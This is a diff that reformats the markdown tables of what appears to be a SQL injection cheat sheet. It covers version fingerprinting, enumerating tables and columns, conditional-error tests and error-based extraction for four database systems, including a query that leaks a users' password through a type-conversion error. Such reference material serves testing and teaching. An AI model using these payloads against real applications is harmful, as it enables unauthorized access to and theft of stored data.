@@ -37,44 +37,44 @@ You can use comments to truncate a query and remove the portion of the original 
 
 You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.
 
-|   |   |
-|---|---|
-|Oracle|`SELECT banner FROM v$version   SELECT version FROM v$instance   `|
-|Microsoft|`SELECT @@version`|
-|PostgreSQL|`SELECT version()`|
-|MySQL|`SELECT @@version`|
+|            |                                                                    |
+| ---------- | ------------------------------------------------------------------ |
+| Oracle     | `SELECT banner FROM v$version   SELECT version FROM v$instance   ` |
+| Microsoft  | `SELECT @@version`                                                 |
+| PostgreSQL | `SELECT version()`                                                 |
+| MySQL      | `SELECT @@version`                                                 |
 
 ## Database contents
 
 You can list the tables that exist in the database, and the columns that those tables contain.
 
-|   |   |
-|---|---|
-|Oracle|`SELECT * FROM all_tables   SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`|
-|Microsoft|`SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   `|
-|PostgreSQL|`SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   `|
-|MySQL|`SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   `|
+|            |                                                                                                                              |
+| ---------- | ---------------------------------------------------------------------------------------------------------------------------- |
+| Oracle     | `SELECT * FROM all_tables   SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`                              |
+| Microsoft  | `SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   ` |
+| PostgreSQL | `SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   ` |
+| MySQL      | `SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   ` |
 
 ## Conditional errors
 
 You can test a single boolean condition and trigger a database error if the condition is true.
 
-|   |   |
-|---|---|
-|Oracle|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`|
-|Microsoft|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`|
-|PostgreSQL|`1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`|
-|MySQL|`SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`|
+|            |                                                                                         |
+| ---------- | --------------------------------------------------------------------------------------- |
+| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`      |
+| Microsoft  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`                         |
+| PostgreSQL | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`          |
+| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |
 
 ## Extracting data via visible error messages
 
 You can potentially elicit error messages that leak sensitive data returned by your malicious query.
 
-|   |   |
-|---|---|
-|Microsoft|`SELECT 'foo' WHERE 1 = (SELECT 'secret') > Conversion failed when converting the varchar value 'secret' to data type int.`|
-|PostgreSQL|`SELECT CAST((SELECT password FROM users LIMIT 1) AS int) > invalid input syntax for integer: "secret"`|
-|MySQL|`SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret'))) > XPATH syntax error: '\secret'`|
+|            |                                                                                                                             |
+| ---------- | --------------------------------------------------------------------------------------------------------------------------- |
+| Microsoft  | `SELECT 'foo' WHERE 1 = (SELECT 'secret') > Conversion failed when converting the varchar value 'secret' to data type int.` |
+| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int) > invalid input syntax for integer: "secret"`                     |
+| MySQL      | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret'))) > XPATH syntax error: '\secret'`               |
 
 ## Batched (or stacked) queries
 
